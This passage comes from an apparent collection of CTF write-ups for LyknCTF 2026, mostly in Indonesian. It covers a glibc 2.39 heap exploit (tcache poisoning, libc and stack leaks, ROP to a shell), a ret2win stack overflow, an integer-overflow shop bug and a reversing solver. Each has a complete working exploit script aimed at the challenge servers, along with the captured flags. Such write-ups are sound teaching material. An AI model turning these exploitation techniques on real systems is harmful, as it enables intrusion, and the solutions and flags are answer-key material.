        "content": "Request `0x100` menghasilkan chunk berukuran `0x110`. Tcache satu size class menampung maksimal tujuh entry.\n\nTahap leak:\n\n1. Buat tujuh chunk `0x100` untuk mengisi tcache `0x110`.\n2. Buat satu chunk `0x100` tambahan sebagai unsorted-bin victim.\n3. Resize tujuh chunk pertama sehingga chunk lama masuk ke tcache.\n4. Free victim saat tcache `0x110` sudah penuh.\n5. Victim masuk ke unsorted bin dan field `fd` berisi pointer ke `main_arena + 0x60`.\n6. Gunakan stale entry untuk membaca `fd` victim.\n\nOffset pada libc yang disediakan:\n\n\n\nAlamat divalidasi harus page-aligned dan berada pada rentang mapping libc 64-bit.",
        "code": "UNSORTED_FD_OFFSET = 0x203AC0 + 0x60\nlibc_base = unsorted_fd - UNSORTED_FD_OFFSET"
      },
      {
        "title": "Leak stack melalui `environ`",
        "content": "Setelah libc base diketahui, tcache poisoning diarahkan ke simbol `environ`.\n\nAda detail glibc 2.39 yang perlu diperhatikan. Ketika entry diambil dari tcache, `tcache_get()` membersihkan field key pada `returned_pointer + 8`. Bila malloc diarahkan tepat ke `environ - 8`, proses ini akan menulis nol ke `environ` dan merusak leak.\n\nTarget dipindahkan ke:\n\n\n\nPointer `environ` kemudian berada pada offset `+0x18` dari fake allocation dan tidak tersentuh oleh pembersihan key:\n\n\n\nNilai tersebut memberikan alamat stack proses.",
        "code": "environ_target = libc.sym.environ - 0x18"
      },
      {
        "title": "Menemukan saved RIP dan PIE base",
        "content": "Alamat `environ` hanya memberikan anchor stack, bukan posisi return address secara langsung. Solver melakukan arbitrary allocation ke dua window stack di sekitar `environ - 0x150` dan membacanya sebagai array qword.\n\nSaat `view_note()` aktif, return address-nya kembali ke instruksi setelah call pada `main`:\n\n\n\nJadi qword yang dicari berbentuk:\n\n\n\nValidasi yang dipakai:\n\n\n\nAlamat qword tersebut adalah slot saved RIP yang nantinya ditimpa.",
        "code": "1f27: call view_note\n1f2c: jmp  main+0x15c"
      },
      {
        "title": "ROP ke `system(\"/bin/sh\")`",
        "content": "Tcache poisoning terakhir diarahkan ke `saved_return - 8`. Pengurangan delapan byte diperlukan karena target tcache harus 16-byte aligned dan payload juga perlu mengganti saved RBP sebelum saved RIP.\n\nChain yang ditulis:\n\n\n\nOffset dari libc remote:\n\n\n\nSaat fungsi selesai, eksekusi berpindah ke chain dan menjalankan:\n\n\n\nSolver lalu mengirim:",
        "code": "chain = flat(\n    0,                         # fake saved RBP\n    libc_base + RET_OFFSET,    # stack alignment\n    libc_base + POP_RDI_OFFSET,\n    libc_base + BINSH_OFFSET,\n    libc.sym.system,\n    libc.sym.exit,\n)"
      },
      {
        "title": "Kenapa solver memakai retry",
        "content": "Input note dibaca dengan `fgets()`. Byte `0x0a` di tengah pointer safe-linking atau ROP chain dianggap newline dan memotong payload.\n\nASLR dapat menghasilkan alamat yang mengandung byte tersebut. Solver memeriksa setiap packed pointer dan ROP chain sebelum dikirim. Bila terdapat `0x0a`, koneksi ditutup dan exploit diulang dengan layout ASLR baru.\n\n\n\nDefault solver mencoba maksimal 20 kali.",
        "code": "if b\"\\n\" in packed_fd:\n    raise RetryExploit(\"newline byte in poisoned tcache fd\")"
      },
      {
        "title": "Menjalankan exploit",
        "content": "Letakkan file berikut dalam satu direktori:",
        "code": "Heap_devil\nlibc.so.6\nsolve.py"
      },
      {
        "title": "Jalankan:",
        "content": "Contoh hasil:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py 15.235.202.47 9009"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport os\r\nimport re\r\nimport time\r\nfrom pathlib import Path\r\n\r\nfrom pwn import ELF, ROP, context, flat, log, p64, remote, process, u64\r\n\r\nBASE_DIR = Path(__file__).resolve().parent\r\nBINARY_PATH = BASE_DIR / \"Heap_devil\"\r\nREMOTE_LIBC_PATH = BASE_DIR / \"libc.so.6\"\r\n\r\nDEFAULT_HOST = \"15.235.202.47\"\r\nDEFAULT_PORT = 9009\r\nFLAG_RE = re.compile(rb\"LYKNCTF\\{[^}\\r\\n]+\\}\")\r\n\r\n# Offsets verified from the supplied Ubuntu GLIBC 2.39.\r\nUNSORTED_FD_OFFSET = 0x203AC0 + 0x60  # main_arena + 0x60\r\nRET_OFFSET = 0x2882F\r\nPOP_RDI_OFFSET = 0x10F78B\r\nBINSH_OFFSET = 0x1CB42F\r\n\r\n\r\nclass RetryExploit(Exception):\r\n    pass\r\n\r\n\r\nclass HeapDevil:\r\n    def __init__(self, io, libc: ELF, is_local: bool = False):\r\n        self.io = io\r\n        self.libc = libc\r\n        self.is_local = is_local\r\n        self.count = 0\r\n\r\n    def menu(self, choice: int) -> None:\r\n        self.io.sendlineafter(b\"> \", str(choice).encode())\r\n\r\n    def create(self, size: int, data: bytes = b\"A\") -> int:\r\n        self.menu(1)\r\n        self.io.sendlineafter(\r\n            b\"Enter note size (max 256): \", str(size).encode()\r\n        )\r\n        self.io.sendafter(b\"Enter data for note: \", data + b\"\\n\")\r\n        index = self.count\r\n        self.count += 1\r\n        return index\r\n\r\n    def view(self, index: int, size: int) -> bytes:\r\n        self.menu(2)\r\n        self.io.sendlineafter(b\"Enter note index\", str(index).encode())\r\n        self.io.recvuntil(b\" DATA: \")\r\n        return self.io.recvn(size)\r\n\r\n    def edit(self, index: int, data: bytes) -> None:\r\n        self.menu(3)\r\n        self.io.sendlineafter(b\"Enter note index\", str(index).encode())\r\n        self.io.sendafter(b\"Enter new data: \", data + b\"\\n\")\r\n\r\n    def delete(self, index: int) -> None:\r\n        self.menu(4)\r\n        self.io.sendlineafter(b\"Enter note index\", str(index).encode())\r\n        self.count -= 1\r\n\r\n    def resize(self, index: int, size: int, data: bytes = b\"R\") -> None:\r\n        self.menu(5)\r\n        self.io.sendlineafter(b\"Enter note index\", str(index).encode())\r\n        self.io.sendlineafter(\r\n            b\"Enter new size (max 512): \", str(size).encode()\r\n        )\r\n        # The program prints the success message before asking for the data.\r\n        self.io.sendafter(b\"Enter data for note: \", data + b\"\\n\")\r\n\r\n    @staticmethod\r\n    def reveal_safe_link(cipher: int) -> int:\r\n        \"\"\"Reverse x ^ (x >> 12), twelve bits at a time.\"\"\"\r\n        key = 0\r\n        plain = 0\r\n        for i in range(1, 6):\r\n            bits = max(0, 64 - 12 * i)\r\n            plain = ((cipher ^ key) >> bits) << bits\r\n            key = plain >> 12\r\n        return plain\r\n\r\n    @classmethod\r\n    def recover_previous_chunk(cls, encoded_fd: int, chunk_size: int) -> int:\r\n        \"\"\"\r\n        The poisoned victim was allocated immediately after the previous chunk:\r\n\r\n            encoded_fd = previous ^ (victim >> 12)\r\n            victim     = previous + chunk_size\r\n        \"\"\"\r\n        guess = cls.reveal_safe_link(encoded_fd)\r\n        guess_key = guess >> 12\r\n\r\n        # Usually both chunks are on the same page. The small search also handles\r\n        # the rare page-boundary case.\r\n        for key in range(guess_key - 4, guess_key + 5):\r\n            previous = encoded_fd ^ key\r\n            if previous & 0xF:\r\n                continue\r\n            if ((previous + chunk_size) >> 12) == key:\r\n                return previous\r\n\r\n        raise RetryExploit(\r\n            f\"could not recover safe-linked pointer {encoded_fd:#x}\"\r\n        )\r\n\r\n    def poison_allocate(self, request_size: int, target: int, data: bytes) -> int:\r\n        \"\"\"Create a two-entry tcache list, poison its tail, and malloc(target).\"\"\"\r\n        base_index = self.count\r\n\r\n        # X and Y are consecutive same-sized chunks.\r\n        self.create(request_size, b\"X\")\r\n        self.create(request_size, b\"Y\")\r\n\r\n        # Free X into the target tcache bin, but keep its note alive at a\r\n        # different size. Deleting that note shifts Y and leaves a duplicate\r\n        # structure. Deleting Y then leaves the off-by-one stale UAF entry.\r\n        self.resize(base_index, 0x30, b\"T\")\r\n        self.delete(base_index)\r\n        self.delete(base_index)\r\n\r\n        leak = self.view(base_index, request_size)\r\n        encoded_fd = u64(leak[:8])\r\n        chunk_size = (request_size + 0x10 + 0xF) & ~0xF\r\n        previous = self.recover_previous_chunk(encoded_fd, chunk_size)\r\n        victim = previous + chunk_size\r\n\r\n        if encoded_fd != (previous ^ (victim >> 12)):\r\n            raise RetryExploit(\"safe-link validation failed\")\r\n\r\n        poisoned_fd = target ^ (victim >> 12)\r\n        packed_fd = p64(poisoned_fd)\r\n        if b\"\\n\" in packed_fd:\r\n            raise RetryExploit(\"newline byte in poisoned tcache fd\")\r\n\r\n        self.edit(base_index, packed_fd)\r\n\r\n        # First allocation pops Y. The second returns the arbitrary target.\r\n        self.create(request_size, b\"A\")\r\n        return self.create(request_size, data)\r\n\r\n    def leak_libc(self) -> int:\r\n        # One survivor, seven 0x110 chunks to fill tcache, an unsorted victim,\r\n        # and a small physical guard that prevents top-chunk consolidation.\r\n        self.create(0x20, b\"A\")\r\n        for _ in range(7):\r\n            self.create(0x100, b\"F\")\r\n        self.create(0x100, b\"V\")\r\n        self.create(0x20, b\"G\")\r\n\r\n        # Free seven chunks into the 0x110 tcache bin.\r\n        for index in range(1, 8):\r\n            self.resize(index, 0x80, b\"R\")\r\n\r\n        # Remove guard, duplicate the last victim structure, then free the\r\n        # victim while the 0x110 tcache is full. It lands in unsorted bin.\r\n        self.delete(9)\r\n        self.delete(0)\r\n        self.delete(7)\r\n\r\n        unsorted_fd = u64(self.view(7, 0x100)[:8])\r\n\r\n        if self.is_local:\r\n            libc_path = os.path.realpath(self.libc.path)\r\n            base = self.io.libs()[libc_path]\r\n        else:\r\n            base = unsorted_fd - UNSORTED_FD_OFFSET\r\n\r\n        if base & 0xFFF or not (0x700000000000 <= base < 0x800000000000):\r\n            raise RetryExploit(f\"invalid libc base {base:#x}\")\r\n\r\n        self.libc.address = base\r\n        log.success(f\"libc base: {base:#x}\")\r\n        return base\r\n\r\n    def leak_stack(self) -> int:\r\n        # tcache_get clears entry->key at returned_pointer + 8. Pointing at\r\n        # environ-0x18 preserves environ itself at fake_note + 0x18.\r\n        environ_target = self.libc.sym.environ - 0x18\r\n        environ_index = self.poison_allocate(0x50, environ_target, b\"E\")\r\n        environ_blob = self.view(environ_index, 0x50)\r\n        stack_environ = u64(environ_blob[0x18:0x20])\r\n\r\n        if not (0x700000000000 <= stack_environ < 0x800000000000):\r\n            raise RetryExploit(f\"invalid environ leak {stack_environ:#x}\")\r\n\r\n        log.success(f\"environ: {stack_environ:#x}\")\r\n        return stack_environ\r\n\r\n    def find_saved_return(self, stack_environ: int) -> tuple[int, int]:\r\n        # With this binary, the main call slot is around environ-0x150. During\r\n        # view_note it contains PIE+0x1f2c. Leak a wider aligned window around it.\r\n        windows = [\r\n            (0x80, (stack_environ - 0x1B0) & ~0xF),\r\n            (0x90, (stack_environ - 0x130) & ~0xF),\r\n        ]\r\n\r\n        for request_size, target in windows:\r\n            note_index = self.poison_allocate(request_size, target, b\"S\")\r\n            blob = self.view(note_index, request_size)\r\n\r\n            for offset in range(0, len(blob) - 7, 8):\r\n                candidate = u64(blob[offset : offset + 8])\r\n                pie_base = candidate - 0x1F2C\r\n                if candidate & 0xFFF != 0xF2C:\r\n                    continue\r\n                if pie_base & 0xFFF:\r\n                    continue\r\n                if not (0x500000000000 <= pie_base < 0x600000000000):\r\n                    continue\r\n\r\n                saved_return = target + offset\r\n                log.success(f\"PIE base: {pie_base:#x}\")\r\n                log.success(\r\n                    f\"saved RIP: {saved_return:#x} \"\r\n                    f\"(environ {saved_return - stack_environ:+#x})\"\r\n                )\r\n                return saved_return, pie_base\r\n\r\n        raise RetryExploit(\"view_note return address was not found on stack\")\r\n\r\n    def get_rop_offsets(self) -> tuple[int, int, int]:\r\n        if not self.is_local:\r\n            return RET_OFFSET, POP_RDI_OFFSET, BINSH_OFFSET\r\n\r\n        old_address = self.libc.address\r\n        self.libc.address = 0\r\n        rop = ROP(self.libc)\r\n        ret_offset = rop.find_gadget([\"ret\"]).address\r\n        pop_rdi_offset = rop.find_gadget([\"pop rdi\", \"ret\"]).address\r\n        binsh_offset = next(self.libc.search(b\"/bin/sh\\0\"))\r\n        self.libc.address = old_address\r\n        return ret_offset, pop_rdi_offset, binsh_offset\r\n\r\n    def spawn_shell(self, saved_return: int) -> None:\r\n        ret_offset, pop_rdi_offset, binsh_offset = self.get_rop_offsets()\r\n        base = self.libc.address\r\n\r\n        chain = flat(\r\n            0,  # fake saved RBP; allocation starts eight bytes before saved RIP\r\n            base + ret_offset,\r\n            base + pop_rdi_offset,\r\n            base + binsh_offset,\r\n            self.libc.sym.system,\r\n            self.libc.sym.exit,\r\n        )\r\n\r\n        if b\"\\n\" in chain:\r\n            raise RetryExploit(\"newline byte in ROP chain\")\r\n\r\n        # saved_return is 8-byte aligned, while tcache requires 16-byte\r\n        # alignment. Allocate at saved_return-8 and replace saved RBP + RIP.\r\n        self.poison_allocate(0x70, saved_return - 8, chain)\r\n\r\n    def run(self) -> bytes:\r\n        self.leak_libc()\r\n        stack_environ = self.leak_stack()\r\n        saved_return, _ = self.find_saved_return(stack_environ)\r\n        self.spawn_shell(saved_return)\r\n\r\n        self.io.sendline(\r\n            b\"cat flag.txt 2>/dev/null || cat /flag 2>/dev/null || \"\r\n            b\"cat /flag.txt 2>/dev/null; exit\"\r\n        )\r\n        return self.io.recvall(timeout=5)\r\n\r\n\r\ndef find_host_libc() -> Path:\r\n    candidates = [\r\n        Path(\"/lib/x86_64-linux-gnu/libc.so.6\"),\r\n        Path(\"/usr/lib/x86_64-linux-gnu/libc.so.6\"),\r\n    ]\r\n    for candidate in candidates:\r\n        if candidate.exists():\r\n            return candidate.resolve()\r\n    raise FileNotFoundError(\"host libc.so.6 was not found\")\r\n\r\n\r\ndef exploit_once(host: str, port: int, local: bool):\r\n    exe = ELF(str(BINARY_PATH), checksec=False)\r\n\r\n    if local:\r\n        libc = ELF(str(find_host_libc()), checksec=False)\r\n        io = process(exe.path)\r\n    else:\r\n        libc = ELF(str(REMOTE_LIBC_PATH), checksec=False)\r\n        io = remote(host, port, timeout=8)\r\n\r\n    context.binary = exe\r\n    context.timeout = 8\r\n\r\n    try:\r\n        output = HeapDevil(io, libc, is_local=local).run()\r\n        return output\r\n    finally:\r\n        io.close()\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(description=\"H34P D3V1L remote exploit\")\r\n    parser.add_argument(\"host\", nargs=\"?\", default=DEFAULT_HOST)\r\n    parser.add_argument(\"port\", nargs=\"?\", type=int, default=DEFAULT_PORT)\r\n    parser.add_argument(\"--local\", action=\"store_true\", help=\"test with host libc\")\r\n    parser.add_argument(\"--retries\", type=int, default=20)\r\n    parser.add_argument(\"--debug\", action=\"store_true\")\r\n    args = parser.parse_args()\r\n\r\n    context.log_level = \"debug\" if args.debug else \"info\"\r\n    attempts = 1 if args.local else max(1, args.retries)\r\n\r\n    for attempt in range(1, attempts + 1):\r\n        log.info(f\"attempt {attempt}/{attempts}\")\r\n        try:\r\n            output = exploit_once(args.host, args.port, args.local)\r\n            match = FLAG_RE.search(output)\r\n            if match:\r\n                flag = match.group().decode()\r\n                print(f\"<FLAG>{flag}</FLAG>\")\r\n                return 0\r\n\r\n            print(output.decode(\"latin-1\", errors=\"replace\"))\r\n            raise RetryExploit(\"shell returned without a flag\")\r\n        except (RetryExploit, EOFError, TimeoutError, OSError) as error:\r\n            log.warning(str(error))\r\n            if attempt != attempts:\r\n                time.sleep(0.25)\r\n\r\n    log.failure(\"exploit failed after all retries\")\r\n    return 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{0utsm4rt3d_th3_h34p_d3v1l}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-pwn-returntolose",
    "title": "Return-to-Lose — Pwn",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LyknCTF 2026\n**Category:** Pwn\n**Flag:** `LYKNCTF{cb39d487e265480b92a274a124c0dd66}`",
    "problemDescription": "| Aspek | Detail |\n|---|---|\n| Vulnerability | Stack buffer overflow (`read(0, buf, 256)` ke `buf[64]`) |\n| Teknik | ret2win |\n| Offset ke RA | 72 byte |\n| Target | `win()` @ `0x4011b6` (No PIE, static) |\n| Mitigasi yang diuji | Canary (tidak ada), NX (tidak relevan, tidak perlu shellcode), CET/SHSTK (enabled di binary, tidak enforced di runtime) |\n\n**Flag:** `LYKNCTF{cb39d487e265480b92a274a124c0dd66}`",
    "tools": [],
    "analysis": "### 2. Vulnerability\n\nDi `vuln()`:\n\n```c\nchar buf[64];\nread(0, buf, 256);   // baca hingga 256 byte ke buffer 64 byte\n```\n\nBuffer `buf` hanya 64 byte, tapi `read()` mengizinkan input hingga 256 byte → classic **stack buffer overflow**, cukup untuk menimpa saved RBP dan return address.\n\n---\n\n### 3. Menentukan Offset\n\nMenggunakan cyclic pattern dari `pwntools` untuk menemukan offset ke return address:\n\n```bash\npython3 -c \"from pwn import *; print(cyclic(100))\"\n```\n\nInput pattern tersebut dikirim via GDB (`pwndbg`):\n\n```\npwndbg> r\n> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\n...\nProgram received signal SIGSEGV.\nRIP  0x401292 (vuln+76) ◂— ret\nRSP  0x7fffffffce18 ◂— 0x6161617461616173 ('saaataaa')\n```\n\nProgram crash tepat di instruksi `ret`, dan nilai di puncak stack (`RSP`) — yaitu byte yang akan di-`pop` sebagai return address — adalah 4 byte pertama string `\"saaa\"`.\n\nMencari offset dari byte tersebut (bukan dari RIP, karena RIP saat crash masih menunjuk instruksi `ret` itu sendiri):\n\n```bash\npython3 -c \"from pwn import *; print(cyclic_find(b'saaa'))\"\n```\n\n**Offset ke return address = 72 byte**, sesuai perhitungan manual:\n`buf[64]` + saved RBP (`8 byte`) = `72 byte`.\n\n---\n\n### 4. Menentukan Target Address\n\nKarena binary **No PIE**, alamat `win()` bersifat statis dan bisa langsung dibaca dari simbol:\n\n```\n0x004011b6      GLOBAL FUNC   144      win\n```\n\n`WIN = 0x4011b6`\n\nTidak diperlukan info leak apa pun.\n\n---",
    "solution": [
      {
        "title": "Binary protections (checksec)",
        "content": "Poin penting:\n- **No canary** → overflow ke saved RBP/return address tidak terdeteksi.\n- **No PIE** → semua alamat fungsi statis, termasuk `win()`, tidak perlu leak.\n- **SHSTK/IBT (Intel CET) enabled** di level binary, namun **tidak di-enforce di runtime** environment ini (kemungkinan kernel/glibc lokal belum mengaktifkan CET secara aktif) — sehingga ret2win polos tetap berhasil tanpa perlu bypass shadow stack.\n\n---",
        "code": "Arch:       amd64-64-little\nRELRO:      Partial RELRO\nStack:      No canary found\nNX:         NX enabled\nPIE:        No PIE (0x400000)\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No"
      },
      {
        "title": "5. Exploit Script",
        "content": "**Payload:**\n\n\nSaat `vuln()` melakukan `ret`, CPU mengambil alamat `0x4011b6` dari stack dan melompat langsung ke `win()`, yang membuka `flag.txt` dan mencetak isinya ke stdout.\n\n---",
        "code": "from pwn import *\ncontext.arch = 'amd64'\n\nOFFSET = 72\nWIN = 0x4011b6\n\np = remote('51.79.140.18', 11094)   # ganti process() -> remote() untuk server\npayload = b'A' * OFFSET + p64(WIN)\np.recvuntil(b'> ')\np.sendline(payload)\nprint(p.recvall(timeout=3).decode(errors='replace'))"
      },
      {
        "title": "6. Hasil",
        "content": "**Local test:**\n\n\n**Remote (server asli):**\n\n\n---",
        "code": "Safe travels!\nLYKNCTF{f4k3_f14g}"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (exploit.py) is provided below:",
        "code": "from pwn import *\r\ncontext.arch = 'amd64'\r\n\r\nOFFSET = 72  # ganti sesuai hasil cyclic_find\r\nWIN = 0x4011b6\r\n\r\np = remote('51.79.140.18', 11094)\r\npayload = b'A' * OFFSET + p64(WIN)\r\np.recvuntil(b'> ')\r\np.sendline(payload)\r\nprint(p.recvall(timeout=3).decode(errors='replace'))"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{cb39d487e265480b92a274a124c0dd66}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-pwn-shop",
    "title": "Shop",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "- **CTF:** LYKNCTF 2026\n- **Category:** Pwn\n- **Vulnerability:** Signed 32-bit integer overflow\n- **Flag:** `LYKNCTF{wr4p_wr4p_wr4p}`",
    "problemDescription": "- **CTF:** LYKNCTF 2026\n- **Category:** Pwn\n- **Vulnerability:** Signed 32-bit integer overflow\n- **Flag:** `LYKNCTF{wr4p_wr4p_wr4p}`",
    "tools": [],
    "analysis": "Menu pembelian membaca indeks item dan quantity sebagai integer. Potongan logikanya setara dengan:\n\n```c\nint total = catalog[index].price * quantity;\n\nprintf(\"Total cost: %d coin\\n\", total);\n\nif (total > balance) {\n    puts(\"Not enough coins. Come back when you're richer.\");\n    continue;\n}\n\nbalance -= total;\n\nif (catalog[index].is_flag && quantity > 0) {\n    print_flag();\n}\n```\n\n`total` bertipe signed 32-bit. Perkalian tidak diperiksa sebelum hasilnya dibandingkan dengan balance.\n\nItem flag punya harga `36,363,636` coin. Quantity positif terkecil yang membuat hasil perkalian melewati `INT_MAX` adalah `60`:\n\n```text\n59 × 36,363,636 = 2,145,454,524\n60 × 36,363,636 = 2,181,818,160\nINT_MAX           = 2,147,483,647\n```\n\nSaat disimpan sebagai `int32_t`, hasil quantity `60` menjadi:\n\n```text\n2,181,818,160 - 2^32 = -2,113,149,136\n```\n\nNilai negatif tersebut selalu lebih kecil dari balance `1,836`, jadi pengecekan saldo lolos. Program kemudian menjalankan:\n\n```text\nbalance = 1836 - (-2113149136)\n        = 2113150972\n```\n\nKarena item yang dibeli adalah flag dan quantity tetap positif, `print_flag()` dipanggil.",
    "solution": [
      {
        "title": "Recon",
        "content": "Challenge menyediakan dua build, `shop` untuk Linux dan `shop.exe` untuk Windows. Analisis exploit memakai ELF Linux.\n\n\n\nHasil penting:\n\n\n\nProteksi memory tidak berpengaruh karena bug-nya ada di perhitungan harga, bukan corrupt stack atau heap.",
        "code": "file shop\nreadelf -hW shop\nreadelf -lW shop | grep -E 'GNU_STACK|GNU_RELRO'\nreadelf -dW shop | grep BIND_NOW"
      },
      {
        "title": "Exploit Manual",
        "content": "Output relevan:",
        "code": "printf 'b\\n3\\n60\\nq\\n' | ./shop"
      },
      {
        "title": "Solver",
        "content": "Solver mendukung binary lokal dan service remote tanpa dependency tambahan."
      },
      {
        "title": "Lokal:",
        "content": "",
        "code": "python3 solve.py"
      },
      {
        "title": "Remote:",
        "content": "Payload yang dikirim:",
        "code": "python3 solve.py HOST PORT"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport ctypes\r\nimport os\r\nimport re\r\nimport socket\r\nimport stat\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nPRICE = 36_363_636\r\nQUANTITY = 60\r\nPAYLOAD = f\"b\\n3\\n{QUANTITY}\\nq\\n\".encode()\r\nFLAG_RE = re.compile(rb\"LYKNCTF\\{[^}\\r\\n]+\\}\")\r\n\r\n\r\ndef wrapped_total(price: int, quantity: int) -> int:\r\n    return ctypes.c_int32(price * quantity).value\r\n\r\n\r\ndef exploit_local(binary: Path) -> bytes:\r\n    if not binary.is_file():\r\n        raise FileNotFoundError(f\"binary not found: {binary}\")\r\n\r\n    binary.chmod(binary.stat().st_mode | stat.S_IXUSR)\r\n    result = subprocess.run(\r\n        [str(binary.resolve())],\r\n        input=PAYLOAD,\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.STDOUT,\r\n        cwd=binary.resolve().parent,\r\n        timeout=10,\r\n        check=False,\r\n    )\r\n    return result.stdout\r\n\r\n\r\ndef exploit_remote(host: str, port: int) -> bytes:\r\n    chunks: list[bytes] = []\r\n    with socket.create_connection((host, port), timeout=8) as sock:\r\n        sock.settimeout(3)\r\n        sock.sendall(PAYLOAD)\r\n        try:\r\n            sock.shutdown(socket.SHUT_WR)\r\n        except OSError:\r\n            pass\r\n\r\n        while True:\r\n            try:\r\n                chunk = sock.recv(4096)\r\n            except socket.timeout:\r\n                break\r\n            if not chunk:\r\n                break\r\n            chunks.append(chunk)\r\n            if FLAG_RE.search(b\"\".join(chunks)):\r\n                break\r\n\r\n    return b\"\".join(chunks)\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Exploit signed 32-bit integer overflow in LYKNCTF Shop\"\r\n    )\r\n    parser.add_argument(\"host\", nargs=\"?\", help=\"remote host\")\r\n    parser.add_argument(\"port\", nargs=\"?\", type=int, help=\"remote port\")\r\n    parser.add_argument(\r\n        \"--binary\",\r\n        type=Path,\r\n        default=Path(__file__).with_name(\"shop\"),\r\n        help=\"local ELF path (default: ./shop beside solve.py)\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    if (args.host is None) != (args.port is None):\r\n        parser.error(\"host and port must be supplied together\")\r\n\r\n    total = wrapped_total(PRICE, QUANTITY)\r\n    if total >= 0:\r\n        raise RuntimeError(\"chosen quantity does not produce a negative int32 total\")\r\n\r\n    print(f\"[+] price         : {PRICE}\")\r\n    print(f\"[+] quantity      : {QUANTITY}\")\r\n    print(f\"[+] wrapped total : {total}\")\r\n\r\n    try:\r\n        if args.host is None:\r\n            data = exploit_local(args.binary)\r\n        else:\r\n            data = exploit_remote(args.host, args.port)\r\n    except (OSError, subprocess.SubprocessError) as exc:\r\n        print(f\"[-] exploit failed: {exc}\", file=sys.stderr)\r\n        return 1\r\n\r\n    text = data.decode(errors=\"replace\")\r\n    print(text, end=\"\" if text.endswith(\"\\n\") else \"\\n\")\r\n\r\n    match = FLAG_RE.search(data)\r\n    if not match:\r\n        print(\"[-] flag not found in target output\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(f\"[+] flag: {match.group().decode()}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{wr4p_wr4p_wr4p}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-rev-controlfreak1",
    "title": "Control Freak 1",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "Flag extracted from reversing custom encryption pipeline in `chall-2`.",
    "problemDescription": "Flag extracted from reversing custom encryption pipeline in `chall-2`.",
    "tools": [],
    "analysis": "1. **Reconnaissance**:\n   - Program takes 1 argument of length `0x21` (33 chars).\n   - Program loops 3 times (iterations `0`, `1`, `2`).\n   - In each iteration:\n     - XORs with custom string pattern.\n     - Performs bitwise rotations.\n     - Permutes indices using mapping array.\n     - Encrypts via custom cumulative XOR block.\n   - Compares output with static byte array.\n\n2. **Exploitation**:\n   - Wrote decoder in Python to invert operations for iteration `2`, `1`, and `0`.\n   - Result: `LYKNCTF{H0W_D1D_Y0U_C0NTR0L_TH4T}`.",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import sys\r\n\r\ntarget = [\r\n    0x66, 0x15, 0xe4, 0x34, 0x0c, 0x1b, 0x3e, 0xd3, 0x22, 0xd1, 0xea, 0x25,\r\n    0x86, 0x12, 0x88, 0x6f, 0xae, 0x57, 0x72, 0x18, 0xc9, 0xdb, 0x10, 0x36,\r\n    0x3e, 0x0b, 0x48, 0x07, 0x44, 0xf9, 0x01, 0xff, 0x07\r\n]\r\n\r\nr13 = [0x52, 0x64, 0x71, 0x51, 0x54, 0x76, 0x2d, 0x39]\r\nr12 = [0x17, 0x8b, 0x23, 0x42, 0xc1, 0x5e, 0x09, 0xa7]\r\nrbp = [\r\n    3, 10, 17, 24, 31, 5, 12, 19, 26, 0, 7, 14, 21, 28, 2, 9, 16, 23, 30, 4,\r\n    11, 18, 25, 32, 6, 13, 20, 27, 1, 8, 15, 22, 29\r\n]\r\n\r\ndef ror8(val, r_bits):\r\n    return ((val >> r_bits) | (val << (8 - r_bits))) & 0xff\r\n\r\ndef backward_iter(new_buf, iter_num):\r\n    cl_init = (0x5a + 0x31 * iter_num) & 0xff\r\n    perm_buf = [0]*33\r\n    prev_cl = cl_init\r\n    for j in range(33):\r\n        cl = new_buf[j]\r\n        r8d = (cl ^ prev_cl) & 0xff\r\n        perm_buf[j] = (r8d ^ (iter_num + 7 * j)) & 0xff\r\n        prev_cl = cl\r\n\r\n    buf_phase1 = [0]*33\r\n    for j in range(33):\r\n        buf_phase1[j] = perm_buf[rbp[j]]\r\n\r\n    buf = [0]*33\r\n    for i in range(33):\r\n        idx_r13 = (i + 3 * iter_num) & 7\r\n        idx_r12 = (iter_num + 5 * i) & 7\r\n        edi = ((0x1d * iter_num) & 0xff + 13 * i) & 0xff\r\n        \r\n        esi = (buf_phase1[i] - r12[idx_r12] - edi) & 0xff\r\n        shift = ((i + iter_num) % 7) + 1\r\n        esi = ror8(esi, shift)\r\n        buf[i] = (esi ^ r13[idx_r13]) & 0xff\r\n    return buf\r\n\r\ncurr = target\r\nfor it in [2, 1, 0]:\r\n    curr = backward_iter(curr, it)\r\n\r\nflag = \"\".join(chr(c) for c in curr)\r\nprint(flag)"
      }
    ],
    "terminalOutputs": [],
